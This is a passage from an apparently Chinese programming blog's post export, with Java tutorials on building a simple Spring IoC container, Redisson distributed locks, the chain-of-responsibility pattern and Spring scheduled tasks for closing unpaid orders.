iterator.hasNext();) &#123; Element element = (Element) iterator.next(); String id=element.attributeValue("id");//获取bean的id属性值 String clazz=element.attributeValue("class");//获取bean的class属性值 BeanDefinition2 beanDefinition=new BeanDefinition2(id,clazz); //2.获取bean的Property属性 for (Iterator subElementIterator = element.elementIterator(); subElementIterator.hasNext();) &#123; Element subElement = (Element) subElementIterator.next(); String propertyName=subElement.attributeValue("name"); String propertyRef= subElement.attributeValue("ref"); String propertyValue=subElement.attributeValue("value"); //3.构造一个propertyDefinition对象,并且添加进List属性中 PropertyDefinition propertyDefinition=new PropertyDefinition(propertyName, propertyRef,propertyValue); beanDefinition.getPropertyDefinitions().add(propertyDefinition); &#125; beanDefines.add(beanDefinition); &#125; &#125; catch (Exception e) &#123; System.out.println("解析xml失败"); &#125; &#125; //这里实例化的功能只是实例化PersonDaoImpl和PersonServiceImpl两个对象，注入的关系还需要下面的函数来解决 private void instanceBeans()&#123; if(beanDefines!=null &amp;&amp; beanDefines.size()&gt;0)&#123; for(BeanDefinition2 beanDefinition:beanDefines)&#123; try &#123; if (beanDefinition.getClassName() != null &amp;&amp; !beanDefinition.getClassName().equals("")) &#123; sigletons.put(beanDefinition.getId(),Class.forName(beanDefinition.getClassName()).newInstance()); System.out.println("id为："+beanDefinition.getId()+"的bean实例化成功"); &#125; &#125;catch (Exception e)&#123; System.out.println("bean实例化失败"); &#125; &#125; &#125; &#125; public Object getBean(String beanName,Class beanClass)&#123; return sigletons.get(beanName); &#125;&#125; ok，其实跟上面一节是差不多的，就是多了一层 xml 解析而已，但是有了 bean 的实例 以及 BeanDefinition 之后呢，我们需要处理依赖关系了，是重点也是难点，代码较长，已经打好详细注释： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950private void injectObject() &#123; for(BeanDefinition2 beanDefinition:beanDefines)&#123; //先拿到一个beanDefinition，比如我先拿到personService2 Object bean = sigletons.get(beanDefinition.getId()); if (bean != null) &#123; try &#123; //通过类Introspector的getBeanInfo方法获取对象的BeanInfo信息 BeanInfo info = Introspector.getBeanInfo(bean.getClass()); //通过BeanInfo来获取属性的描述器(PropertyDescriptor),通过这个属性描述器就可以获取某个属性对应的getter/setter方法,然后我们就可以通过反射机制来调用这些方法。 //获得bean所有的属性描述 PropertyDescriptor[] pds = info.getPropertyDescriptors(); //遍历要注入的bean的所有属性,就是&lt;property&gt;元素所有的注入的值或者对象，没有&lt;property&gt;元素则直接跳过 for (PropertyDefinition propertyDefinition : beanDefinition.getPropertyDefinitions()) &#123; //拿到一个&lt;property&gt;元素后，遍历这个bean下的所有属性值，看是否有一样的，有的话则说明要将数据注入进这个属性中 for (PropertyDescriptor propertyDescriptor : pds) &#123; //比如我这里的propertyDefinition恰好拿到的是&lt;property name="personDao" ref="personDao"/&gt; //因为我们的bean恰好是personService2，那么这个类中的有两个私有属性：private PersonDao personDao;private Integer age; //判断personDao和&lt;property name="personDao" ref="personDao"/&gt;中的name是否相等，这里显然是相等的，那么就要进行注入了，就是调用setter方法 if (propertyDefinition.getName().equals(propertyDescriptor.getName())) &#123; //获取用于写入属性值的setter方法 Method setter = propertyDescriptor.getWriteMethod(); //如果确实有setter方法 if (setter != null) &#123; //用来存储引用的值 Object value=null; //这里是判断是否注入的是对象，如果是对象，那么就有ref属性，否则是普通的value if (propertyDefinition.getRef() != null &amp;&amp; !propertyDefinition.getRef().equals("")) &#123; //拿到personDao实例对象，先存在value中 value=sigletons.get(propertyDefinition.getRef()); &#125;else &#123; //普通的值需要转换成对象，比如这里的24转为Integer类型的value，先存到Object变量中 value= ConvertUtils.convert(propertyDefinition.getValue(), propertyDescriptor.getPropertyType()); &#125; setter.setAccessible(true);//保证setter方法可以访问私有 try &#123; setter.invoke(bean, value);//把引用对象注入到属性，这里就是将personDao注入到PersonService里了 &#125; catch (Exception e) &#123; System.out.println("注入失败..."); &#125; &#125; break;//找到了注入的属性后，跳出循环 &#125; &#125; &#125; &#125;catch (Exception e)&#123; System.out.println("依赖注入失败..."); &#125; &#125; &#125;&#125; 一方面，里面有一个比较陌生的 Introspector 类，他是干啥的呢？ 内省(Introspector) 是 Java 语言对 JavaBean 类属性、事件的一种缺省处理方法。 JavaBean是一种特殊的类，主要用于传递数据信息，这种类中的方法主要用于访问私有的字段，且方法名符合某种命名规则。如果在两个模块之间传递信息，可以将信息封装进JavaBean中，这种对象称为“值对象”(Value Object)，或“VO”。方法比较少。这些信息储存在类的私有变量中，通过set()、get()获得。 简而言之，就是说，对于我们的私有属性，一般都是约定用set()、get()获得和设值，Java JDK中提供了一套 API 用来访问某个属性的 getter/setter 方法，这就是内省。 将JavaBean中的属性封装起来进行操作。在程序把一个类当做JavaBean来看，就是调用Introspector.getBeanInfo()方法，得到的BeanInfo对象封装了把这个类当做JavaBean看的结果信息，即属性的信息。 getPropertyDescriptors()，获得属性的描述，可以采用遍历BeanInfo的方法，来查找、设置类的属性。 注意到，下面他执行 PropertyDescriptor[] pds = info.getPropertyDescriptors(); PropertyDescriptor类表示JavaBean类通过存储器导出一个属性。主要方法： getPropertyType()，获得属性的Class对象; getReadMethod()，获得用于读取属性值的方法；getWriteMethod()，获得用于写入属性值的方法; hashCode()，获取对象的哈希值; setReadMethod(Method readMethod)，设置用于读取属性值的方法; setWriteMethod(Method writeMethod)，设置用于写入属性值的方法。 总而言之啊，这个类是用于获取Java Bean类的属性、方法等，最后用反射来执行setter方法即可。 完整的一个SwgClassPathXmlApplicationContext2是： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116public class SwgClassPathXmlApplicationContext2 &#123; private List&lt;BeanDefinition2&gt; beanDefines=new ArrayList&lt;&gt;();//用来存储所有的beans private Map&lt;String, Object&gt; sigletons =new HashMap&lt;&gt;();//用来存储实例化后的bean public SwgClassPathXmlApplicationContext2(String fileName)&#123; this.readXml(fileName); this.instanceBeans(); //3.实现对依赖对象的注入功能 this.injectObject(); &#125; private void injectObject() &#123; for(BeanDefinition2 beanDefinition:beanDefines)&#123; //先拿到一个beanDefinition，比如我先拿到personService2 Object bean = sigletons.get(beanDefinition.getId()); if (bean != null) &#123; try &#123; //通过类Introspector的getBeanInfo方法获取对象的BeanInfo信息 BeanInfo info = Introspector.getBeanInfo(bean.getClass()); //通过BeanInfo来获取属性的描述器(PropertyDescriptor),通过这个属性描述器就可以获取某个属性对应的getter/setter方法,然后我们就可以通过反射机制来调用这些方法。 //获得bean所有的属性描述 PropertyDescriptor[] pds = info.getPropertyDescriptors(); //遍历要注入的bean的所有属性,就是&lt;property&gt;元素所有的注入的值或者对象，没有&lt;property&gt;元素则直接跳过 for (PropertyDefinition propertyDefinition : beanDefinition.getPropertyDefinitions()) &#123; //拿到一个&lt;property&gt;元素后，遍历这个bean下的所有属性值，看是否有一样的，有的话则说明要将数据注入进这个属性中 for (PropertyDescriptor propertyDescriptor : pds) &#123; //比如我这里的propertyDefinition恰好拿到的是&lt;property name="personDao" ref="personDao"/&gt; //因为我们的bean恰好是personService2，那么这个类中的有两个私有属性：private PersonDao personDao;private Integer age; //判断personDao和&lt;property name="personDao" ref="personDao"/&gt;中的name是否相等，这里显然是相等的，那么就要进行注入了，就是调用setter方法 if (propertyDefinition.getName().equals(propertyDescriptor.getName())) &#123; //获取用于写入属性值的setter方法 Method setter = propertyDescriptor.getWriteMethod(); //如果确实有setter方法 if (setter != null) &#123; //用来存储引用的值 Object value=null; //这里是判断是否注入的是对象，如果是对象，那么就有ref属性，否则是普通的value if (propertyDefinition.getRef() != null &amp;&amp; !propertyDefinition.getRef().equals("")) &#123; //拿到personDao实例对象，先存在value中 value=sigletons.get(propertyDefinition.getRef()); &#125;else &#123; //普通的值需要转换成对象，比如这里的24转为Integer类型的value，先存到Object变量中 value= ConvertUtils.convert(propertyDefinition.getValue(), propertyDescriptor.getPropertyType()); &#125; setter.setAccessible(true);//保证setter方法可以访问私有 try &#123; //执行写入属性值的方法 setter.invoke(bean, value);//把引用对象注入到属性，这里就是将personDao注入到PersonService里了 &#125; catch (Exception e) &#123; System.out.println("注入失败..."); &#125; &#125; break;//找到了注入的属性后，跳出循环 &#125; &#125; &#125; &#125;catch (Exception e)&#123; System.out.println("依赖注入失败..."); &#125; &#125; &#125; &#125; private void readXml(String fileName) &#123; //创建一个读取器 SAXReader saxReader=new SAXReader(); Document document=null; try &#123; //获取要读取的配置文件的路径 URL xmlPath=this.getClass().getClassLoader().getResource(fileName); //读取文件内容 document=saxReader.read(xmlPath); //1.获取xml中的根元素 Element rootElement=document.getRootElement(); for (Iterator iterator = rootElement.elementIterator(); iterator.hasNext();) &#123; Element element = (Element) iterator.next(); String id=element.attributeValue("id");//获取bean的id属性值 String clazz=element.attributeValue("class");//获取bean的class属性值 BeanDefinition2 beanDefinition=new BeanDefinition2(id,clazz); //2.获取bean的Property属性 for (Iterator subElementIterator = element.elementIterator(); subElementIterator.hasNext();) &#123; Element subElement = (Element) subElementIterator.next(); String propertyName=subElement.attributeValue("name"); String propertyRef= subElement.attributeValue("ref"); String propertyValue=subElement.attributeValue("value"); //3.构造一个propertyDefinition对象,并且添加进List属性中 PropertyDefinition propertyDefinition=new PropertyDefinition(propertyName, propertyRef,propertyValue); beanDefinition.getPropertyDefinitions().add(propertyDefinition); &#125; beanDefines.add(beanDefinition); &#125; &#125; catch (Exception e) &#123; System.out.println("解析xml失败"); &#125; &#125; //这里实例化的功能只是实例化PersonDaoImpl和PersonServiceImpl两个对象，注入的关系还需要下面的函数来解决 private void instanceBeans()&#123; if(beanDefines!=null &amp;&amp; beanDefines.size()&gt;0)&#123; for(BeanDefinition2 beanDefinition:beanDefines)&#123; try &#123; if (beanDefinition.getClassName() != null &amp;&amp; !beanDefinition.getClassName().equals("")) &#123; sigletons.put(beanDefinition.getId(),Class.forName(beanDefinition.getClassName()).newInstance()); System.out.println("id为："+beanDefinition.getId()+"的bean实例化成功"); &#125; &#125;catch (Exception e)&#123; System.out.println("bean实例化失败"); &#125; &#125; &#125; &#125; public Object getBean(String beanName,Class beanClass)&#123; return sigletons.get(beanName); &#125;&#125; 测试一下吧： 1234567public class Main2 &#123; public static void main(String[] args) &#123; SwgClassPathXmlApplicationContext2 sctx = new SwgClassPathXmlApplicationContext2("beans2.xml"); PersonService2 personService2 = (PersonService2)sctx.getBean("personService2",PersonService2.class); personService2.sayHello(); &#125;&#125; 运行结果： 123456id为：personService2的bean实例化成功id为：personDao的bean实例化成功age:24service中的sayHello方法调用成功调用注入的dao方法成功 这样就完成了一个 IOC 的功能。这里在注入的时候用的是 jdk 提供的内省，这个内省专门用于获取 bean 的某个属性的getter/setter方法。最后用利用反射来执行getter/setter方法。下一篇实现注解版的依赖注入。]]></content>
      <tags>
        <tag>spring学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[26、前端在windows本地下的部署]]></title>
    <url>%2F2018%2F07%2F21%2F26%E3%80%81%E5%89%8D%E7%AB%AF%E5%9C%A8windows%E6%9C%AC%E5%9C%B0%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%2F</url>
    <content type="text"><![CDATA[前端在windows本地下的部署 前端在windows本地下的部署————–&gt;前端在windows本地下的部署]]></content>
      <tags>
        <tag>电商项目实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[25、Redisson实现redis分布式锁]]></title>
    <url>%2F2018%2F07%2F21%2F25%E3%80%81Redisson%E5%AE%9E%E7%8E%B0redis%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%2F</url>
    <content type="text"><![CDATA[Redisson实现redis分布式锁 1、引入依赖1234567891011&lt;dependency&gt; &lt;groupId&gt;org.redisson&lt;/groupId&gt; &lt;artifactId&gt;redisson&lt;/artifactId&gt; &lt;version&gt;2.9.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.dataformat&lt;/groupId&gt; &lt;artifactId&gt;jackson-dataformat-avro&lt;/artifactId&gt; &lt;version&gt;2.9.0&lt;/version&gt;&lt;/dependency&gt; 2、初始化Redissson12345678910111213141516171819202122232425@Slf4j@Componentpublic class RedissonManager &#123; private Config config = new Config(); private Redisson redisson = null; private static String redis1Ip = PropertiesUtil.getProperty("redis1.ip"); private static Integer redis1Port = Integer.parseInt(PropertiesUtil.getProperty("redis1.port")); @PostConstruct private void init()&#123; try &#123; //测试是单redis config.useSingleServer().setAddress(new StringBuilder().append(redis1Ip).append(":").append(redis1Port).toString()); redisson = (Redisson) Redisson.create(config); log.info("初始化redisson结束"); &#125;catch (Exception e)&#123; log.error("初始化redisson失败",e); &#125; &#125; public Redisson getRedisson()&#123; return redisson; &#125;&#125; 3、定时调度123456789101112131415161718192021@Scheduled(cron = "0 */1 * * * ?")//每隔一分钟执行，一分钟的整数倍public void closeOrderTaskV4() throws InterruptedException &#123; RLock lock = redissonManager.getRedisson().getLock(Const.REDIS_LOCK.CLOSE_ORDER_TASK_LOCK); boolean getLock = false; try &#123; //最大排队时间统一用0，50秒是lock的key的存活时间 if(getLock = lock.tryLock(0,50, TimeUnit.SECONDS))&#123;//trylock增加锁 log.info("===获取&#123;&#125;,ThreadName:&#123;&#125;",Const.REDIS_LOCK.CLOSE_ORDER_TASK_LOCK,Thread.currentThread().getName()); int hour = Integer.parseInt(PropertiesUtil.getProperty("close.order.task.time.hour","2")); orderService.closeOrder(hour); &#125;else&#123; log.info("===没有获得分布式锁:&#123;&#125;",Const.REDIS_LOCK.CLOSE_ORDER_TASK_LOCK); &#125; &#125;finally &#123; if(!getLock)&#123; return; &#125; log.info("===释放分布式锁:&#123;&#125;",Const.REDIS_LOCK.CLOSE_ORDER_TASK_LOCK); lock.unlock(); &#125;&#125; 这里进入这个定时调度的方法之后，第一行会在tryLock的时候在redis中塞入一个lockkey：CLOSE_ORDER_TASK_LOCK，如果塞入成功，返回true，表示可以用这把锁，否则不能使用，等待下次定时任务来的时候再检查。 4、redis主从模式将第二个redis的配置文件配置为： 12# slaveof &lt;masterip&gt; &lt;masterport&gt;slaveof 127.0.0.1 6379 这样，跟6379形成主从关系，主redis可以进行修改插入操作，但是从redis只能读取数据。 配置成这种模式，也是可以直接跑通的，lockkey只能存储在主redis中。从redis数据与之同步。]]></content>
      <tags>
        <tag>电商项目实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[25.自己动手写springIOC(1)]]></title>
    <url>%2F2018%2F07%2F21%2F25.%E8%87%AA%E5%B7%B1%E5%8A%A8%E6%89%8B%E5%86%99springIOC(1)%2F</url>
    <content type="text"><![CDATA[简单实现spring IOC 容器的依赖注入功能. 这三篇文章的代码地址： https://gitee.com/_swg/mySpringIoc 为了方便，直接在 spring-boot 工程中进行操作了。 我们知道，spring 的核心就是处理 bean ，那么传统的 xml 如何获取 bean 的呢？ 我新建一个配置文件beans.xml放在resources资源文件夹下: 12345678&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"&gt; &lt;bean id="personService" class="com.swg.myspring.service.PersonServiceImpl"/&gt;&lt;/beans&gt; 我们还需要定义一个接口和实现类： 123public interface PersonService &#123; void sayHello();&#125; 123456public class PersonServiceImpl implements PersonService&#123; @Override public void sayHello()&#123; System.out.println("hello..."); &#125;&#125; 我在这里定义了一个名字叫personService的bean，那么我们如何拿到呢？ 123456789public class Main &#123; public static void main(String[] args) &#123; //读取配置文件实例化一个IoC容器 ApplicationContext ctx = new ClassPathXmlApplicationContext("beans.xml"); //从容器中获取Bean，注意此处完全“面向接口编程，而不是面向实现” PersonService personService = (PersonService)ctx.getBean("personService",PersonService.class); personService.sayHello(); &#125;&#125; 那么如何自己实现呢？其实也很简单，就是读取一下xml文件嘛！ 在初始化的时候，就将所有的 bean 全部读进一个 map 中，这个 map 的 key 为 bean 的 id，key 的 value 为 package+class ，那么我要用这个 bean 的时候就直接根据 id 获取到类的全路径名，然后根据反射拿到 class 的实例对象，最后根据这个实例对象拿到里面的属性值。 思路已经确定下来了，下面就直接开干。 先引入两个依赖，一个是 dom4j 来处理 xml ， 一个是 lombok ，来简化一些程序。 123456789101112&lt;dependency&gt; &lt;groupId&gt;dom4j&lt;/groupId&gt; &lt;artifactId&gt;dom4j&lt;/artifactId&gt; &lt;version&gt;1.6.1&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;version&gt;1.18.0&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt;&lt;/dependency&gt; 首先呢，spring 获取上下文的时候是 new ClassPathXmlApplicationContext ，那么我们这里用自定义的上下文，比如叫做 SwgClassPathXmlApplicationContext ： 123public class SwgClassPathXmlApplicationContext &#123; &#125; 那么显然需要一个构造方法来传入配置文件的名字，从而去读取配置文件。 12345public class SwgClassPathXmlApplicationContext &#123; public SwgClassPathXmlApplicationContext(String fileName)&#123; &#125;&#125; 我们的目的是先将 bean 的 id 和 class (这里暂时只考虑这两个属性) 信息保存到一个地方，这里用一个对象来封装即可： 1234567@Data@NoArgsConstructor@AllArgsConstructorpublic class BeanDefinition &#123; private String id;//bean的id private String className;//bean的类&#125; 那么我们就要读取配置文件的 bean 的 id 和 class 信息了： 1234567891011121314151617181920212223private List&lt;BeanDefinition&gt; beanDefines=new ArrayList&lt;BeanDefinition&gt;();//用来存储所有的beansprivate void readXml(String fileName) &#123; SAXReader saxReader=new SAXReader(); Document document=null; try &#123; //获取要读取的配置文件的路径 URL xmlPath=this.getClass().getClassLoader().getResource(fileName); //读取文件内容 document=saxReader.read(xmlPath); //获取xml中的根元素 Element rootElement=document.getRootElement(); for (Iterator iterator = rootElement.elementIterator(); iterator.hasNext();) &#123; Element element = (Element) iterator.next(); String id=element.attributeValue("id");//获取bean的id属性值 String clazz=element.attributeValue("class");//获取bean的class属性值 BeanDefinition beanDefinition=new BeanDefinition(id,clazz); beanDefines.add(beanDefinition); &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125;&#125; 我们不要忘记 xml 文件中的 bean 是啥样的： 1&lt;bean id="personService" class="com.swg.myspring.service.PersonServiceImpl"/&gt; 那么这个方法读取完，放到一个 List&lt;BeanDefinition&gt; 中， BeanDefinition 这个对象显然封装了两个属性， id=personService ， class=com.swg.myspring.service.PersonServiceImpl 。 那么，我要对这里的 BeanDefinition 进行实例化，存到一个 map 中， key 就为 id ， value 就为 PersonServiceImpl 对象。 下面来看看如何实现的吧： 1234567891011121314151617private Map&lt;String, Object&gt; sigletons =new HashMap&lt;String, Object&gt;();//用来存储实例化后的beanprivate void instanceBeans()&#123; if(beanDefines!=null &amp;&amp; beanDefines.size()&gt;0)&#123; for(BeanDefinition beanDefinition:beanDefines)&#123; try &#123; if (beanDefinition.getClassName() != null &amp;&amp; !beanDefinition.getClassName().equals("")) &#123; sigletons.put(beanDefinition.getId(),Class.forName(beanDefinition.getClassName()).newInstance()); System.out.println("id为："+beanDefinition.getId()+"的bean实例化成功"); &#125; &#125;catch (Exception e)&#123; System.out.println("bean实例化失败"); e.printStackTrace(); &#125; &#125; &#125;&#125; 显然，就是根据 class 反射得到 PersonServiceImpl 对象。那么这一步放到构造函数中的话，那么主程序 new 完，对应的实例对象就已经存在于这个 map 中了，我只需要有一个公共方法从这个 map 中取出来即可。 123public Object getBean(String beanName,Class beanClass)&#123; return sigletons.get(beanName);&#125; 其实这里的实现没有用到 beanClass ，我只是想跟原来的实现形式统一一下，可以去掉。 完整的一个 SwgClassPathXmlApplicationContext 为： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152public class SwgClassPathXmlApplicationContext &#123; private List&lt;BeanDefinition&gt; beanDefines=new ArrayList&lt;BeanDefinition&gt;();//用来存储所有的beans private Map&lt;String, Object&gt; sigletons =new HashMap&lt;String, Object&gt;();//用来存储实例化后的bean public SwgClassPathXmlApplicationContext(String fileName)&#123; this.readXml(fileName); this.instanceBeans(); &#125; private void readXml(String fileName) &#123; SAXReader saxReader=new SAXReader(); Document document=null; try &#123; //获取要读取的配置文件的路径 URL xmlPath=this.getClass().getClassLoader().getResource(fileName); //读取文件内容 document=saxReader.read(xmlPath); //获取xml中的根元素 Element rootElement=document.getRootElement(); for (Iterator iterator = rootElement.elementIterator(); iterator.hasNext();) &#123; Element element = (Element) iterator.next(); String id=element.attributeValue("id");//获取bean的id属性值 String clazz=element.attributeValue("class");//获取bean的class属性值 BeanDefinition beanDefinition=new BeanDefinition(id,clazz); System.out.println(beanDefinition.getId()); beanDefines.add(beanDefinition); &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; private void instanceBeans()&#123; if(beanDefines!=null &amp;&amp; beanDefines.size()&gt;0)&#123; for(BeanDefinition beanDefinition:beanDefines)&#123; try &#123; if (beanDefinition.getClassName() != null &amp;&amp; !beanDefinition.getClassName().equals("")) &#123; sigletons.put(beanDefinition.getId(),Class.forName(beanDefinition.getClassName()).newInstance()); System.out.println("id为："+beanDefinition.getId()+"的bean实例化成功"); &#125; &#125;catch (Exception e)&#123; System.out.println("bean实例化失败"); e.printStackTrace(); &#125; &#125; &#125; &#125; public Object getBean(String beanName,Class beanClass)&#123; return sigletons.get(beanName); &#125;&#125; 那么我们在主程序中进行测试一下： 1234567public class Main1 &#123; public static void main(String[] args) &#123; SwgClassPathXmlApplicationContext sctx = new SwgClassPathXmlApplicationContext("beans.xml"); PersonService personService = (PersonService)sctx.getBean("personService",PersonService.class); personService.sayHello(); &#125;&#125; 运行结果： 12id为：personService的bean实例化成功hello... 程序正常执行了，我们完成了一个解析 xml 和做了简单的 bean 的实例化。但是没有实现 spring 的依赖注入，这里为后面的实现打下基础。总结一下就是，解析 xml 拿到 class 类信息，然后根 class 类信息反射完成实例化。 参考 手写springIOC的三篇文章都是转载自 https://www.cnblogs.com/shunyang/p/3283796.html ，写的很好，再加上自己的一些理解。]]></content>
      <tags>
        <tag>spring学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[24.SpringAop--责任链模式]]></title>
    <url>%2F2018%2F07%2F21%2F24.SpringAop--%E8%B4%A3%E4%BB%BB%E9%93%BE%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[spring aop链式调用用到了责任链模式。 责任链模式方案一实现链式调用： 1234567891011121314151617public abstract class Handler &#123; private Handler successor; public void setSuccessor(Handler successor)&#123; this.successor = successor; &#125; public void execute()&#123; handleProcess(); if(successor != null)&#123; successor.execute(); &#125; &#125; protected abstract void handleProcess();&#125; 123456789101112131415161718192021222324252627282930313233public class Client &#123; static class HandlerA extends Handler&#123; @Override protected void handleProcess() &#123; System.out.println("handle by a"); &#125; &#125; static class HandlerB extends Handler&#123; @Override protected void handleProcess() &#123; System.out.println("handle by b"); &#125; &#125; static class HandlerC extends Handler&#123; @Override protected void handleProcess() &#123; System.out.println("handle by c"); &#125; &#125; public static void main(String[] args) &#123; Handler handlerA = new HandlerA(); Handler handlerB = new HandlerB(); Handler handlerC = new HandlerC(); handlerA.setSuccessor(handlerB); handlerB.setSuccessor(handlerC); handlerA.execute(); &#125;&#125; 打印结果： 123handle by ahandle by bhandle by c 但是这种方案需要我们自己一个一个地set下一个调用的对象，比较麻烦。 方案二实现链式调用： 对设置链式再进行封装一下： 12345678910111213141516171819202122232425262728public class Client2 &#123; static class HandlerA extends ChainHandler&#123; @Override protected void handleProcess() &#123; System.out.println("handle by a"); &#125; &#125; static class HandlerB extends ChainHandler&#123; @Override protected void handleProcess() &#123; System.out.println("handle by b"); &#125; &#125; static class HandlerC extends ChainHandler&#123; @Override protected void handleProcess() &#123; System.out.println("handle by c"); &#125; &#125; public static void main(String[] args) &#123; List&lt;ChainHandler&gt; handlers = Arrays.asList(new HandlerA(),new HandlerB(),new HandlerC()); Chain chain = new Chain(handlers); chain.proceed(); &#125;&#125; 123456789101112131415public class Chain &#123; private List&lt;ChainHandler&gt; handlers; private int index = 0; public Chain(List&lt;ChainHandler&gt; handlers)&#123; this.handlers = handlers; &#125; public void proceed()&#123; if(index &gt;= handlers.size())&#123; return; &#125; handlers.get(index++).execute(this); &#125;&#125; 12345678public abstract class ChainHandler &#123; public void execute(Chain chain)&#123; handleProcess(); chain.proceed(); &#125; protected abstract void handleProcess();&#125; spring的链式调用的原理与这个实现类似。]]></content>
      <tags>
        <tag>spring学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[24、spring schedule定时任务]]></title>
    <url>%2F2018%2F07%2F21%2F24%E3%80%81spring%20schedule%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[spring schedule定时任务 1、引入目标定时自动对超过两个小时还未支付的订单对其进行取消，并且重置库存。 2、配置首先是spring配置文件引入spring-schedule123456xmlns:task="http://www.springframework.org/schema/task"...http://www.springframework.org/schema/taskhttp://www.springframework.org/schema/task/spring-task.xsd...&lt;task:annotation-driven/&gt; 补充：针对applicationContext-datasource.xml中的dataSource读取配置文件的信息无法展现的问题，在spring的配置文件中增加一条配置： &lt;context:property-placeholder location=”classpath:datasource.properties”/&gt; 3、定时调度代码1234567891011121314@Component@Slf4jpublic class CloseOrderTask &#123; @Autowired private OrderService orderService; @Scheduled(cron = "0 */1 * * * ?")//每隔一分钟执行，一分钟的整数倍的时候执行 public void closeOrderTaskV1()&#123; log.info("关闭订单定时任务启动"); int hour = Integer.parseInt(PropertiesUtil.getProperty("close.order.task.time.hour","2")); orderService.closeOrder(hour); log.info("关闭订单定时任务结束"); &#125;&#125; @Component一定要加，否则spring扫描不到。 close.order.task.time.hour 也是配置在snailmall.properties中的，这里配置的是默认的2，即两个小时，下订单超过两个小时仍然不支付，就取消该订单。 对于orderService里面的具体方法：1234567891011121314151617181920212223242526@Overridepublic void closeOrder(int hour) &#123; Date closeDateTime = DateUtils.addHours(new Date(),-hour); //找到状态为未支付并且下单时间是早于当前检测时间的两个小时的时间,就将其置为取消 //SELECT &lt;include refid="Base_Column_List"/&gt; from mmall_order WHERE status = #&#123;status&#125; &lt;![CDATA[ and create_time &lt;= #&#123;date&#125; ]]&gt; order by create_time desc List&lt;Order&gt; orderList = orderMapper.selectOrderStatusByCreateTime(Const.OrderStatusEnum.NO_PAY.getCode(),DateTimeUtil.dateToStr(closeDateTime)); for(Order order:orderList)&#123; List&lt;OrderItem&gt; orderItemList = orderItemMapper.getByOrderNo(order.getOrderNo()); for(OrderItem orderItem:orderItemList)&#123; //一定要用主键where条件，防止锁表。同时必须是支持MySQL的InnoDB. Integer stock = productMapper.selectStockByProductId(orderItem.getProductId()); if(stock == null)&#123; continue; &#125; //更新产品库存 Product product = new Product(); product.setId(orderItem.getProductId()); product.setStock(stock+orderItem.getQuantity()); productMapper.updateByPrimaryKeySelective(product); &#125; //关闭order //UPDATE mmall_order set status = 0 where id = #&#123;id&#125; orderMapper.closeOrderByOrderId(order.getId()); log.info("关闭订单OrderNo:&#123;&#125;",order.getOrderNo()); &#125;&#125; 这样，debug启动项目，一分钟后就会自动执行closeOrderTaskV1方法了。找一个未支付的订单，进行相应测试。4、存在的问题经过实验发现，同时部署两台tomcat服务器，执行定时任务的时候是两台都同时执行的，显然不符合我们集群的目标，我们只需要在同一时间只有一台服务器执行这个定时任务即可。那么解决方案就是引入redis分布式锁。 5、第一种改进V1.0 第一步：setnx进去，如果成功，说明塞入redis成功，抢占到锁 第二步：抢到锁之后，先设置一下过期时间，即后面如果执行不到delete，也会将这个锁自动释放掉，防止死锁 第三步：关闭订单，删除redis锁 存在的问题：如果因为tomcat关闭或tomcat进程在执行closeOrder()方法的时候，即还没来得及设置锁的过期时间的时候，这个时候会造成死锁。需要改进。 123456789101112131415161718192021222324252627//第一个版本，在突然关闭tomcat的时候有可能出现死锁@Scheduled(cron = "0 */1 * * * ?")//每隔一分钟执行，一分钟的整数倍public void closeOrderTaskV2()&#123; log.info("关闭订单定时任务启动"); //设置锁，value是用当前时间+timeout进行设置的 long timeout = Long.parseLong(PropertiesUtil.getProperty("lock.timeout")); Long setnxResult = RedisShardPoolUtil.setnx(Const.REDIS_LOCK.CLOSE_ORDER_TASK_LOCK,String.valueOf(System.currentTimeMillis()+timeout)); if(setnxResult != null &amp;&amp; setnxResult.intValue() ==1)&#123; //说明被当前的tomcat进程抢到锁，下面就可以关闭订单 closeOrder(Const.REDIS_LOCK.CLOSE_ORDER_TASK_LOCK); &#125;else &#123; log.info("没有获取分布式锁：&#123;&#125;",Const.REDIS_LOCK.CLOSE_ORDER_TASK_LOCK); &#125; log.info("关闭订单定时任务结束");&#125;private void closeOrder(String lockName) &#123; //给锁一个过期时间，如果因为某个原因导致下面的锁没有被删除，造成死锁 RedisShardPoolUtil.expire(lockName,50); log.info("获取&#123;&#125;，ThreadName:&#123;&#125;",Const.REDIS_LOCK.CLOSE_ORDER_TASK_LOCK,Thread.currentThread().getName()); int hour = Integer.parseInt(PropertiesUtil.getProperty("close.order.task.time.hour","2")); orderService.closeOrder(hour); //关闭订单之后就立即删除这个锁 RedisShardPoolUtil.del(lockName); log.info("释放&#123;&#125;，ThreadName:&#123;&#125;",Const.REDIS_LOCK.CLOSE_ORDER_TASK_LOCK,Thread.currentThread().getName()); System.out.println("=============================================");&#125; 6、第二种改进V2.0 具体的逻辑代码：12345678910111213141516171819202122232425262728@Scheduled(cron = "0 */1 * * * ?")//每隔一分钟执行，一分钟的整数倍public void closeOrderTaskV3()&#123; log.info("关闭订单定时任务启动"); //设置锁，value是用当前时间+timeout进行设置的 long timeout = 